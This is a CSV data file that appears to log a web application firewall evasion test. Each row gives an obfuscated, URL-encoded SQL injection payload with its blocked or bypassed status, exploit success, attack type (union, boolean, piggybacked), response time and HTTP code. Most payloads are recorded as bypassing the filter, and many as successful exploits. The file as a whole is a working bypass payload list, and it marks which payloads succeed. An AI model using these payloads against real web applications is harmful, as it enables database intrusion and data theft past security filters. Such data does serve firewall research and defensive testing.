Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@=1%0b||+{`if`+1}=1+like%0b{`if`+1}=1+||',Bypassed,No,None,Unknown,0.016,72.56,No,500
0%27<@!=1+||+not+1=+(!%0b{x+(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0216,72.56,No,200
0%27<@=1+||%0b!+{x%0b(select+1)}=1=+(!+{x,Bypassed,Yes,unionAtk,Unknown,0.015,72.56,No,200
0%27<@=1.+||%0bnot+{x%0b(select+1)}=1=+(!%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0184,72.56,No,200
0%27<@!=1.%0b||%0b!+{x+(select+1)}=1=%0b(not%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0242,72.56,No,200
0'<@!=1+||%0bnot+1=%0b(not+{`if`+1}=1),Bypassed,No,None,Unknown,0.0239,72.56,No,500
0%27<@!=.1+||+!~0=%0b(!+{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0098,72.56,No,200
0%27<@=1.+||+!+1=+(not%7e0)%0bor,Bypassed,Yes,unionAtk,Unknown,0.0288,72.56,No,200
0'<@!=1.+or%0bnot+{x+(select%0b1)}=1=+(not%0b{x,Blocked,No,None,Unknown,0.0078,72.56,No,403
0'<@=1.+||+not%7e0=+(!%0btrue)%0b||,Bypassed,No,None,Unknown,0.0113,72.56,No,500
0%27<@=1.+||+{a+1}=1%0blike%0b{a+1}=1%0bor',Bypassed,No,None,Unknown,0.0193,72.56,No,500
0%27<@!=1+or+!%0b{a+1}=1=+(!%0b{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0117,72.56,No,200
0'<@=1%0bor+not%0b{x+(select%0b1)}=1=+(!+{`if`,Bypassed,No,None,Unknown,0.0142,72.56,No,500
0%27||+!@<@+||%0b{a%0b1}=1%0blike+{x%0b(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0098,72.56,No,200
0%27<@=1%0b||+not%0b1=+(not+{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0151,72.56,No,200
0'<@!=.1%0b||+not~false=+(not+{x%0b(select+,Bypassed,No,None,Unknown,0.0096,72.56,No,500
0'<@!=1+||+not+1=%0b(not%0b{x%0b(select+,Bypassed,No,None,Unknown,0.0165,72.56,No,500
0%27<@!=1.+or%0b1%0blike+true+||',Bypassed,No,None,booleanAtk,0.0064,72.56,No,500
0'<@!=1.%0bor%0b!%7efalse=%0b(!+{x+(select+1)}=1,Bypassed,No,None,booleanAtk,0.0112,72.56,No,500
0%27<@=1%0b||+0=%0b(not%0b{a+1}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0177,72.56,No,200
0%27<@!=.1%0bor%0bnot%0b{x%0b(select+1)}=1=%0b(false),Bypassed,Yes,unionAtk,booleanAtk,0.015,72.42,No,200
0'<@=.1+||%0bnot+{`if`%0b1}=1=%0b(not+{x+,Bypassed,No,None,Unknown,0.0211,72.42,No,500
0'<@=1.%0bor%0bnot%0b1=%0b(not%0b{x%0b(select%0b1)}=1,Bypassed,No,None,Unknown,0.0218,72.42,No,500
0'or+@<@.+or+not+{a+1}=1=%0b(!%0b,Bypassed,No,None,Unknown,0.0158,72.42,No,500
0%27<@=1+||%0b!+{x+(select%0b1)}=1=+(not%0b{x,Blocked,No,None,Unknown,0.0103,72.42,No,403
0'<@=1+or+!%0b{`if`+1}=1=+(!%0b1),Bypassed,No,None,Unknown,0.0131,72.42,No,500
0%27||%0b!@<@.%0b||+!+{`if`+1}=1=%0b(!+,Bypassed,Yes,unionAtk,Unknown,0.0239,72.49,No,200
0'<@!=1%0bor%0b!%0b{a%0b1}=1=+(!+{x+(select,Bypassed,No,None,Unknown,0.0108,72.56,No,500
0%27<@!=1.%0b||+!%0b1=+(!+{x%0b(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0292,72.56,No,200
0%27<@!=1+||+{x+(select%0b1)}=1%0blike%0b{x+(select+1)}=1+,Blocked,No,None,Unknown,0.0156,72.56,No,403
0'<@!=1+or%0b!+{x%0b(select+1)}=1=%0b(!+{x,Bypassed,No,None,Unknown,0.0158,72.56,No,500
0'<@!=.1%0bor+not+{x%0b(select%0b1)}=1=%0b(not+{a,Bypassed,No,None,Unknown,0.0194,72.56,No,500
0'<@!=1%0b||+!+{a+1}=1=%0b(not+1),Bypassed,No,None,Unknown,0.0167,72.56,No,500
0'<@=1.+or%0bnot%7efalse=%0b(not%0b{x%0b(select%0b1)}=1,Blocked,No,None,booleanAtk,0.0126,72.56,No,403
0'<@=1+||%0b0=%0b(!%7e0)+||',Bypassed,No,None,Unknown,0.021,72.56,No,500
0%27<@=1+or%0b!+{a%0b1}=1=%0b(!%0btrue),Bypassed,Yes,unionAtk,booleanAtk,0.0084,72.56,No,200
0'<@=1+or+!+{`if`+1}=1=%0b(!%0b{x+(select,Bypassed,No,None,Unknown,0.029,72.56,No,500
0'<@!=1.+or%0bnot%7efalse=+(!+{x%0b(select%0b1)}=1,Blocked,No,None,booleanAtk,0.0107,72.56,No,403
0%27<@!=1.+or%0b!%0b{`if`+1}=1=%0b(not%7efalse),Bypassed,Yes,unionAtk,booleanAtk,0.0138,72.56,No,200
0%27<@=.1%0b||%0b!+true=+(false)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0121,72.56,No,200
0%27<@!=1%0b||+!%0b{x+(select%0b1)}=1=%0b(not%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0158,72.56,No,200
0%27<@!=.1%0bor%0bnot~false=%0b(not%0b{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,booleanAtk,0.0091,72.56,No,200
0'<@=1+or+!+true=%0b(!+{a%0b1}=1),Bypassed,No,None,booleanAtk,0.0267,72.56,No,500
0'<@=1%0bor%0bnot+{x+(select+1)}=1=+(not%0b,Bypassed,No,None,Unknown,0.0309,72.56,No,500
0%27<@!=1.%0bor%0bfalse=+(false)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0194,72.56,No,200
0'<@!=1.+or+{`if`+1}=1%0blike%0b{`if`+1}=1--+,Bypassed,No,None,piggyAtk,0.023,72.56,No,500
0%27<@!=1.%0bor+not%0b{a%0b1}=1=%0b(!+{`if`%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0146,72.56,No,200
0%27<@!=.1+or+{x%0b(select+1)}=1+like+{x%0b(select+1)}=1+,Bypassed,Yes,unionAtk,Unknown,0.0199,72.56,No,200
0%27||%0b@<@.+||+!%0b{x%0b(select+1)}=1=+(not,Bypassed,Yes,unionAtk,Unknown,0.0145,72.56,No,200
0'<@=.1+or%0bnot~false=+(!%0b{a+1}=1),Bypassed,No,None,booleanAtk,0.0176,72.56,No,500
0%27<@!=1.%0bor%0bnot%0b{a%0b1}=1=+(not%0b{a+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0153,72.56,No,200
0%27<@!=.1+||+not%7e0=+(!%0b{a+1}=1),Bypassed,Yes,unionAtk,Unknown,0.0403,72.56,No,200
0'<@=.1+or+true+like%0b{`if`+1}=1--+,Bypassed,No,None,piggyAtk,0.0197,72.56,No,500
0'<@!=1%0bor%0bnot+{a+1}=1=%0b(not+{x+,Bypassed,No,None,Unknown,0.0206,72.56,No,500
0%27<@!=1.+||%0bnot%0b{x+(select+1)}=1=+(!+{x,Blocked,No,None,Unknown,0.015,72.56,No,403
0%27<@=1.%0bor+false=+(not%0b{x%0b(select+1)}=1),Bypassed,Yes,unionAtk,booleanAtk,0.0238,72.56,No,200
0%27<@=1.%0b||%0bnot+{`if`+1}=1=%0b(!%0b{`if`%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0301,72.56,No,200
0%27<@!=1+||+{a+1}=1+like+{a+1}=1+or%27,Bypassed,Yes,unionAtk,Unknown,0.015,72.56,No,200
0'<@!=1%0bor%0bnot%0b{x+(select%0b1)}=1=%0b(!+{x,Bypassed,No,None,Unknown,0.0203,72.56,No,500
0'<@!=1%0bor+not~false=+(not+{a+1}=1),Bypassed,No,None,booleanAtk,0.0199,72.56,No,500
0%27<@!=1.%0b||%0bnot~0=+(not%7efalse)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0107,72.56,No,200
0'<@=1.%0b||+not+{x+(select%0b1)}=1=%0b(not%0b{`if`,Bypassed,No,None,Unknown,0.0113,72.56,No,500
0%27<@!=.1+||+not+{`if`+1}=1=%0b(not+true),Bypassed,Yes,unionAtk,Unknown,0.022,72.56,No,200
0'<@=1%0b||+not+{x+(select+1)}=1=%0b(not+{x,Bypassed,No,None,Unknown,0.0142,72.56,No,500
0%27<@=1%0bor+!+{`if`+1}=1=%0b(not+1),Bypassed,Yes,unionAtk,Unknown,0.0107,72.56,No,200
0'<@=.1%0b||%0bnot+true=+(!+{x%0b(select+1)}=1,Bypassed,No,None,Unknown,0.0159,72.56,No,500
0%27<@=1+or%0b!%0b{x%0b(select+1)}=1=%0b(not%0b{`if`,Bypassed,Yes,unionAtk,Unknown,0.01,72.56,No,200
0%27<@=.1+or+not+{x%0b(select+1)}=1=%0b(!+{x,Bypassed,Yes,unionAtk,Unknown,0.0131,72.56,No,200
0%27<@=1.%0b||%0bnot%7efalse=%0b(!+{x+(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0187,72.56,No,200
0%27<@!=.1%0b||+not+{`if`+1}=1=+(!+{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0233,72.56,No,200
0%27<@=1.%0b||%0bnot~false=%0b(not%0b{x%0b(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0146,72.42,No,200
0%27<@!=1.%0bor%0bnot+{x%0b(select%0b1)}=1=%0b(not%0b{`if`,Bypassed,Yes,unionAtk,Unknown,0.0227,72.42,No,200
0%27<@=1%0bor+!%0b{`if`+1}=1=+(not+{a+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0288,72.42,No,200
0'<@!=1%0b||+!+{x%0b(select%0b1)}=1=+(not%0b,Bypassed,No,None,Unknown,0.035,72.42,No,500
0%27<@=1.+||+not%0b1=+(not%0b{`if`+1}=1),Bypassed,Yes,unionAtk,Unknown,0.0204,72.42,No,200
0'<@=1.+||+!+{x+(select%0b1)}=1=%0b(not+{x,Blocked,No,None,Unknown,0.0113,72.44,No,403
0'or+@<@.+or%0bnot+{a+1}=1=+(not%0b,Blocked,No,None,Unknown,0.0081,72.56,No,403
0'<@!=1.%0b||+!+{`if`%0b1}=1=%0b(not+{x+(select,Bypassed,No,None,Unknown,0.0068,72.56,No,500
0%27<@=1.+||%0b!+{x+(select+1)}=1=+(!%7e,Blocked,No,None,Unknown,0.0159,72.56,No,403
0'<@=.1%0bor+!%0b{`if`%0b1}=1=+(!%0b{`if`+,Bypassed,No,None,Unknown,0.0104,72.56,No,500
0%27<@!=1.%0b||%0bnot+{x%0b(select+1)}=1=+(!+,Bypassed,Yes,unionAtk,Unknown,0.0146,72.56,No,200
0'<@!=1%0bor+!%0b{x+(select%0b1)}=1=%0b(not+{`if`,Bypassed,No,None,Unknown,0.018,72.56,No,500
0%27<@!=1+or+not%0b1=%0b(!+{x%0b(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0119,72.56,No,200
0'<@!=1+||%0b{`if`%0b1}=1+like+{x+(select%0b1)}=1%23,Bypassed,No,None,piggyAtk,0.0147,72.56,No,500
0%27<@!=.1%0b||%0b!%0b{x%0b(select%0b1)}=1=%0b(not+{`if`,Bypassed,Yes,unionAtk,Unknown,0.0224,72.56,No,200
0%27<@!=.1%0bor%0b{a+1}=1%0blike+{x+(select+1)}=1%23,Bypassed,Yes,unionAtk,piggyAtk,0.0178,72.56,No,200
0'||+1<@.%0b||%0bnot+{`if`+1}=1=%0b(not+,Bypassed,No,None,Unknown,0.0157,72.56,No,500
0'<@=.1%0b||+!%0b1=+(!~false)+or,Bypassed,No,None,booleanAtk,0.0223,72.56,No,500
0%27<@!=1+||%0b!%0b{a+1}=1=%0b(not%0b{a%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0312,72.56,No,200
0'<@=.1+or%0b{`if`+1}=1+like%0b{a+1}=1%0bor%27,Bypassed,No,None,Unknown,0.0213,72.56,No,500
0'<@=1.%0bor+not+{x+(select%0b1)}=1=+(not%0b,Bypassed,No,None,Unknown,0.0096,72.56,No,500
0'<@=1.%0b||+not+{x+(select+1)}=1=%0b(not%0b{a,Bypassed,No,None,Unknown,0.0134,72.56,No,500
0%27<@!=.1+||+false=%0b(!+{`if`+1}=1)%0b||,Bypassed,Yes,unionAtk,Unknown,0.0152,72.56,No,200
0%27<@!=1.+||+not~0=%0b(not+{a+1}=1),Bypassed,Yes,unionAtk,Unknown,0.0075,72.56,No,200
0%27<@!=1.%0bor+!+{x%0b(select%0b1)}=1=%0b(not%7efalse,Bypassed,Yes,unionAtk,booleanAtk,0.0267,72.56,No,200
0%27<@!=1.+or%0b!+1=+(not~false)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0188,72.56,No,200
0'<@!=1+||+!%0b{x%0b(select+1)}=1+is%0bfalse+or,Bypassed,No,None,booleanAtk,0.0139,72.56,No,500
0%27<@=1%0bor+not+{x+(select+1)}=1=+(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0225,72.56,No,200
0%27<@=1+||+!+{x+(select+1)}=1=+(!+{x,Blocked,No,None,Unknown,0.0155,72.56,No,403
0'<@!=.1+||%0btrue%0blike+{`if`%0b1}=1+or',Bypassed,No,None,booleanAtk,0.0345,72.56,No,500
0%27<@=.1%0b||%0b!%0b{a%0b1}=1=+(!%0b{x+,Bypassed,Yes,unionAtk,Unknown,0.0185,72.56,No,200
0'<@!=1.%0b||+!+true=+(not+1)%0bor,Bypassed,No,None,booleanAtk,0.0127,72.56,No,500
0%27<@=.1+||+not%7e0=%0b(!%0btrue)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0133,72.56,No,200
0%27<@=1.+||%0bnot+{a%0b1}=1=%0b(!%0b{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0151,72.56,No,200
0%27<@=1.%0bor+false=+(!%0b{a+1}=1)+or,Bypassed,Yes,unionAtk,booleanAtk,0.0102,72.56,No,200
0%27<@!=1+||+not+true=+(not%0b{`if`+1}=1),Bypassed,Yes,unionAtk,Unknown,0.0258,72.56,No,200
0%27<@=1.+or%0bnot+{x%0b(select%0b1)}=1=+(!+{a,Bypassed,Yes,unionAtk,Unknown,0.0311,72.56,No,200
0%27<@!=.1+||+!+{`if`%0b1}=1=+(not+true),Bypassed,Yes,unionAtk,Unknown,0.0198,72.56,No,200
0%27<@!=1%0bor+!%0b{`if`%0b1}=1=+(not+{x+,Bypassed,Yes,unionAtk,Unknown,0.0328,72.56,No,200
0%27<@=1.+||+not+{`if`+1}=1=+(!%0b1),Bypassed,Yes,unionAtk,Unknown,0.0176,72.56,No,200
0%27<@!=.1%0bor%0bnot+{`if`%0b1}=1=+(false)%0bor,Bypassed,Yes,unionAtk,booleanAtk,0.02,72.56,No,200
0'<@!=1.%0bor+!~0=%0b(not+{x+(select+,Bypassed,No,None,Unknown,0.0217,72.56,No,500
0%27<@!=.1+or+not+{x%0b(select%0b1)}=1=%0b(!%0b{`if`,Bypassed,Yes,unionAtk,Unknown,0.0253,72.56,No,200
0'<@!=.1+||%0b!+{`if`+1}=1=%0b(!%0b{x%0b(select,Bypassed,No,None,Unknown,0.0147,72.56,No,500
0%27<@!=1.+or+not~0=%0b(!+{x%0b(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0114,72.56,No,200
0'<@=1+or+!+{a%0b1}=1=+(!+{x%0b(select,Bypassed,No,None,Unknown,0.0132,72.56,No,500
0'<@=1.%0b||%0bnot+{a+1}=1=%0b(not+{x%0b(select,Bypassed,No,None,Unknown,0.0136,72.56,No,500
0'<@!=1+||+!%0b{`if`%0b1}=1=+(!%0b{x%0b(select,Bypassed,No,None,Unknown,0.0215,72.56,No,500
0'<@!=1.%0bor+not%0b{`if`%0b1}=1=%0b(not%0b{`if`+1}=1,Bypassed,No,None,Unknown,0.0167,72.56,No,500
0'<@=.1+||%0b!+true=+(not+{x+(select+1)}=1,Blocked,No,None,Unknown,0.0091,72.56,No,403
0'<@!=1%0bor+not+{a%0b1}=1=+(not%0b{x+(select,Bypassed,No,None,Unknown,0.0096,72.42,No,500
0'<@=1.%0bor%0b!%0b{x+(select+1)}=1=+(0),Bypassed,No,None,Unknown,0.0225,72.42,No,500
0%27<@!=1+or%0b!+{x+(select+1)}=1=+(not+{a,Blocked,No,None,Unknown,0.0051,72.42,No,403
0%27<@=1%0bor+!%0b{`if`%0b1}=1=+(!+{x+,Bypassed,Yes,unionAtk,Unknown,0.0235,72.42,No,200
0'<@!=1+||+not+{x%0b(select%0b1)}=1=+(!%0b{x,Bypassed,No,None,Unknown,0.0287,72.42,No,500
0%27<@!=1+or%0b!~false=+(!+true)%0bor,Bypassed,Yes,unionAtk,booleanAtk,0.0174,72.44,No,200
0%27<@=1+||+!+{`if`+1}=1=+(!+{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0144,72.56,No,200
0%27||%0b@<@.+or+{`if`%0b1}=1%0blike+1+or%27,Bypassed,Yes,unionAtk,Unknown,0.0255,72.56,No,200
0%27<@=.1%0b||+not+{a%0b1}=1=+(!+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0195,72.56,No,200
0%27<@=1.%0bor+!~0=%0b(not+{x%0b(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0209,72.56,No,200
0%27<@!=1.+||+0=%0b(not%7e0)+or',Bypassed,No,None,Unknown,0.0167,72.56,No,500
0%27<@!=1+or+true+like%0b1--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.021,72.56,No,200
0%27<@!=1.+or%0bnot%0b{a+1}=1=%0b(not+{x+,Bypassed,Yes,unionAtk,Unknown,0.0195,72.56,No,200
0%27<@=1%0b||+!%0b{x%0b(select+1)}=1=%0b(not%7e0,Bypassed,Yes,unionAtk,Unknown,0.0329,72.56,No,200
0'<@!=1.%0b||+{a+1}=1+like+{x%0b(select+1)}=1%0bor',Bypassed,No,None,Unknown,0.0134,72.56,No,500
0'<@=.1%0bor+not%0b{a%0b1}=1=+(0)%0bor,Bypassed,No,None,Unknown,0.0136,72.56,No,500
0'<@!=1.+or%0b!+{x+(select+1)}=1=%0b(!%0b{a,Blocked,No,None,Unknown,0.0129,72.56,No,403
0'<@=1.%0b||+not+{a+1}=1=+(not+{x+(select,Bypassed,No,None,Unknown,0.0296,72.56,No,500
0'<@!=.1+or+!+{x+(select%0b1)}=1=+(not%0b,Blocked,No,None,Unknown,0.0169,72.56,No,403
0%27<@!=1.+or%0b!+1=+(not+{x+(select%0b,Blocked,No,None,Unknown,0.0277,72.56,No,403
0%27<@=.1+or+not%7e0=%0b(not+1)+||,Bypassed,Yes,unionAtk,Unknown,0.0174,72.56,No,200
0'<@!=1+||+!+{`if`+1}=1=+(not%0b{`if`%0b,Bypassed,No,None,Unknown,0.0194,72.56,No,500
0'<@=.1+or%0b!+{x+(select%0b1)}=1=+(not%7efalse,Blocked,No,None,booleanAtk,0.0175,72.56,No,403
0%27<@=.1+or+not+{x+(select+1)}=1=+(not+,Blocked,No,None,Unknown,0.0125,72.56,No,403
0'<@!=1.+||+not+{x%0b(select%0b1)}=1=%0b(!+,Bypassed,No,None,Unknown,0.0126,72.56,No,500
0%27<@=1+or%0bnot%0b{x%0b(select+1)}=1=+(!~0,Bypassed,Yes,unionAtk,Unknown,0.0182,72.56,No,200
0'<@!=1.+||+!%0b{`if`+1}=1=%0b(not+1),Bypassed,No,None,Unknown,0.0121,72.56,No,500
0%27or+1<@+||+{`if`%0b1}=1+like%0b{a%0b1}=1+or,Bypassed,Yes,unionAtk,Unknown,0.0238,72.56,No,200
0%27<@=.1+||+not+1=%0b(!+1)%0bor,Bypassed,Yes,unionAtk,Unknown,0.0183,72.56,No,200
0%27<@!=1%0bor+!+{a%0b1}=1=%0b(not%0b{`if`%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0159,72.56,No,200
0'<@!=1+or+!%7efalse=%0b(!~0)+||,Bypassed,No,None,booleanAtk,0.0162,72.56,No,500
0'<@!=1.+||+not+{x+(select%0b1)}=1=+(not+{x,Blocked,No,None,Unknown,0.0112,72.56,No,403
0'<@=1.+||+{`if`+1}=1%0blike%0b{x+(select+1)}=1%0b||%27,Bypassed,No,None,Unknown,0.0171,72.56,No,500
0%27<@!=1.+or+!%0b{x+(select%0b1)}=1=+(!+,Bypassed,Yes,unionAtk,Unknown,0.017,72.56,No,200
0%27<@=1.+or%0b!%0b{`if`+1}=1=+(!+{`if`%0b,Bypassed,Yes,unionAtk,Unknown,0.0091,72.56,No,200
0%27<@=.1+||+!%0b{x%0b(select%0b1)}=1=+(not+{a,Bypassed,Yes,unionAtk,Unknown,0.0149,72.56,No,200
0%27<@!=.1+or+not%0b{x%0b(select%0b1)}=1=+(!%0b{a,Bypassed,Yes,unionAtk,Unknown,0.0195,72.56,No,200
0'<@=1.%0b||+!~false=+(!%0b{`if`+1}=1),Bypassed,No,None,Unknown,0.0306,72.56,No,500
0'<@=1.+or+not+{x+(select+1)}=1=%0b(!%7e,Blocked,No,None,Unknown,0.0086,72.56,No,403
0'<@=1%0bor+!%0b1=+(not%0b{x+(select+,Bypassed,No,None,Unknown,0.0067,72.56,No,500
0'<@=1.%0bor+!%0b{`if`%0b1}=1=+(not+1),Bypassed,No,None,Unknown,0.0098,72.56,No,500
0'<@=.1+or+not+{a+1}=1=+(not+{x+(select,Bypassed,No,None,Unknown,0.0115,72.56,No,500
0%27<@=1+or+!+{`if`+1}=1=+(not+{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0219,72.56,No,200
0%27<@!=1.%0bor%0b!%0b{x+(select+1)}=1=%0b(not%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0205,72.56,No,200
0%27<@!=1.%0b||%0b{x+(select+1)}=1+like%0b{x+(select+1)}=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0113,72.56,No,200
0'<@!=1.%0bor+!%0b{a%0b1}=1=+(!%0b{x%0b,Bypassed,No,None,Unknown,0.0102,72.56,No,500
0%27<@=1.%0b||%0b!~0=+(not%0b{a+1}=1),Bypassed,Yes,unionAtk,Unknown,0.0164,72.56,No,200
0%27<@=.1%0b||+{a+1}=1+like+{x%0b(select+1)}=1%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0133,72.56,No,200
0'<@!=1+or+!%0btrue=%0b(not+{`if`+1}=1),Bypassed,No,None,booleanAtk,0.019,72.56,No,500
0%27<@!=1.%0b||%0b!+{x+(select%0b1)}=1=%0b(not+{`if`,Bypassed,Yes,unionAtk,Unknown,0.022,72.56,No,200
0%27<@=1.+or%0bnot%0b{x%0b(select+1)}=1=%0b(not%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0121,72.42,No,200
0'<@!=1%0bor+false=+(not~false)%0b||%27,Bypassed,No,None,booleanAtk,0.023,72.42,No,500
0'||%0b!@<@+or%0b!+{x%0b(select+1)}=1=+(!,Blocked,No,None,Unknown,0.0144,72.42,No,403
0'<@!=.1%0b||%0bnot+{x+(select+1)}=1=+(not+{x,Bypassed,No,None,Unknown,0.0226,72.42,No,500
0'<@=.1+||+!+{a+1}=1=+(not%0b{a%0b,Bypassed,No,None,Unknown,0.0214,72.42,No,500
0%27<@=1+or+not+{x%0b(select+1)}=1=%0b(not+1,Bypassed,Yes,unionAtk,Unknown,0.017,72.44,No,200
0'<@!=1+or+not+{x+(select%0b1)}=1=+(not%0b{a,Blocked,No,None,Unknown,0.028,72.56,No,403
0%27<@!=1.+or%0bnot+{`if`+1}=1=%0b(not+{a+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0119,72.56,No,200
0%27<@!=.1%0b||%0bnot%0b{x+(select+1)}=1=+(!%0b{`if`,Bypassed,Yes,unionAtk,Unknown,0.019,72.56,No,200
0%27<@=1%0bor+!%0b{a%0b1}=1=+(not+{`if`+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0228,72.56,No,200
0%27<@!=.1+||+true+like%0b{a+1}=1%0b||',Bypassed,No,None,Unknown,0.019,72.56,No,500
0%27<@=.1+||%0b!+{x+(select+1)}=1=+(!%0b,Blocked,No,None,Unknown,0.0148,72.56,No,403
0%27<@!=1.+or%0bnot%0b{x%0b(select+1)}=1=%0b(not%0b{x,Bypassed,Yes,unionAtk,Unknown,0.026,72.56,No,200
0%27<@=1.+or+not~0=%0b(not~false)%0bor,Bypassed,Yes,unionAtk,booleanAtk,0.0154,72.56,No,200
0'<@!=1.%0bor+not+{`if`+1}=1=+(not+{x+(select,Bypassed,No,None,Unknown,0.0114,72.56,No,500
0%27<@!=1.+or+not+{x+(select%0b1)}=1=+(!+{x,Blocked,No,None,Unknown,0.0051,72.56,No,403
0%27<@=1.%0b||+!%0b{a+1}=1=%0b(not%0b{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0157,72.56,No,200
0%27<@=1+or+not%0b{a%0b1}=1=%0b(not+{`if`+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0119,72.56,No,200
0%27<@!=1+||%0b!+true=%0b(!%0b{x%0b(select+,Bypassed,Yes,unionAtk,Unknown,0.0162,72.56,No,200
0%27<@!=1%0b||+not~0=+(!%0b1)%0bor,Bypassed,Yes,unionAtk,Unknown,0.0112,72.56,No,200
0%27<@=1.+or%0b!%0b{a+1}=1=+(not~false),Bypassed,Yes,unionAtk,booleanAtk,0.0222,72.56,No,200
0%27<@!=.1+||%0b!+{`if`%0b1}=1=%0b(!+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0212,72.56,No,200
0'<@=1.%0bor%0bnot%0b{x+(select+1)}=1=%0b(!%0b{a,Bypassed,No,None,Unknown,0.0189,72.56,No,500
0%27<@=1+or%0b!+{a+1}=1=%0b(not+true),Bypassed,Yes,unionAtk,booleanAtk,0.0211,72.56,No,200
0'<@=1.%0bor+!~false=+(!+{x%0b(select%0b,Bypassed,No,None,booleanAtk,0.0106,72.56,No,500
0%27<@=.1+||+!%7e0=%0b(not+{`if`%0b1}=1),Bypassed,Yes,unionAtk,Unknown,0.0179,72.56,No,200
0%27<@=.1+||+not+{x%0b(select%0b1)}=1=+(not~false,Bypassed,Yes,unionAtk,Unknown,0.0105,72.56,No,200
0'<@!=1%0b||+not+{x%0b(select+1)}=1=+(!+{x,Bypassed,No,None,Unknown,0.0154,72.56,No,500
0%27<@!=1+or%0bfalse=%0b(not%0b{x+(select%0b1)}=1),Bypassed,Yes,unionAtk,booleanAtk,0.0159,72.56,No,200
0%27<@=1.+or+not%0btrue=%0b(not%0b{a%0b1}=1),Bypassed,Yes,unionAtk,booleanAtk,0.031,72.56,No,200
0%27<@!=1.+||%0bnot~false=+(not%0b{x+(select+,Bypassed,Yes,unionAtk,Unknown,0.01,72.56,No,200
0%27<@!=.1%0bor%0bnot~0=+(!%0b{x+(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.013,72.56,No,200
0%27<@=.1+or+!%0b{`if`+1}=1=+(!+1),Bypassed,Yes,unionAtk,Unknown,0.0163,72.56,No,200
0%27<@=1.%0bor+!+{`if`+1}=1=%0b(!+{`if`+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0263,72.56,No,200
0%27<@=.1+||+not+{a+1}=1=%0b(!+{a%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0148,72.56,No,200
0'<@=.1+||%0b!+{a+1}=1=+(not+{a+1}=1,Bypassed,No,None,Unknown,0.0099,72.56,No,500
0%27<@=1%0b||+not+{`if`%0b1}=1=+(!%0b{x+(select,Bypassed,Yes,unionAtk,Unknown,0.01,72.56,No,200
